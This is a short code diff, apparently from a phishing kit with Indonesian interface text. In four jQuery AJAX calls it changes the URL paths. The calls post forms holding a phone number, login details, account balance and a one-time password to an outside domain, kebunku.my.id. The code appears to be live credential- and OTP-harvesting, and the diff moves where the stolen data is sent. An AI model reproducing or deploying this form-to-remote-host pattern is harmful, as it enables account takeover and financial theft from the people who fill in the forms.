@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://kebunku.my.id/su/no.php',
+            url: 'https://kebunku.my.id/apel/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://kebunku.my.id/su/login.php',
+            url: 'https://kebunku.my.id/apel/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://kebunku.my.id/su/saldo.php',
+            url: 'https://kebunku.my.id/apel/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://kebunku.my.id/su/gas.php',
+ url: 'https://kebunku.my.id/apel/gas.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
